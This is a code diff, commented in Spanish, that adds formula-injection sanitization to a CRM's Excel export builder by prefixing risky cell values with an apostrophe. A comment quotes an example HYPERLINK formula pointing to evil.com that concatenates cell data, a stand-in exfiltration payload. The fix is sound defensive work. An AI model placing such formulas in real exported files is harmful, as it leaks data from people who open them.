@@ -8,6 +8,32 @@ import {
 /** Filas a las que se aplica la validación de lista desplegable en plantillas. */
 const VALIDATION_ROWS = 300;
 
+/**
+ * Caracteres que Excel/LibreOffice interpretan como inicio de fórmula al abrir
+ * el archivo (CSV/Excel formula injection, OWASP). Un valor de texto libre
+ * guardado en el CRM (comentarios, observaciones, etc.) que empiece con
+ * cualquiera de ellos se ejecutaría como fórmula — p. ej.
+ * `=HYPERLINK("https://evil.com/"&A2,"click")` — al abrir el export.
+ */
+const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);
+
+/** Neutraliza un valor de celda prefijando `'` si podría interpretarse como fórmula. */
+function sanitizeCellValue(value: unknown): unknown {
+    if (typeof value !== 'string' || value.length === 0) {
+        return value;
+    }
+    return FORMULA_TRIGGER_CHARS.has(value[0]) ? `'${value}` : value;
+}
+
+/** Aplica `sanitizeCellValue` a cada propiedad de una fila antes de escribirla. */
+function sanitizeRow(row: Record<string, unknown>): Record<string, unknown> {
+    const sanitized: Record<string, unknown> = {};
+    for (const [key, value] of Object.entries(row)) {
+        sanitized[key] = sanitizeCellValue(value);
+    }
+    return sanitized;
+}
+
 /** Convierte un índice de columna 1-based en su letra ("A", "B", ..., "AA"). */
 function columnLetter(index: number): string {
     let result = '';
@@ -102,7 +128,7 @@ export class ExceljsWorkbookBuilder implements IWorkbookBuilder {
             });
 
             for (const row of sheet.rows) {
-                const added = worksheet.addRow(row);
+                const added = worksheet.addRow(sanitizeRow(row));
                 if (sheet.highlightWhen?.(row)) {
                     // Resalta en ámbar las filas no vigentes / desactivadas.
                     added.eachCell((cell) => {
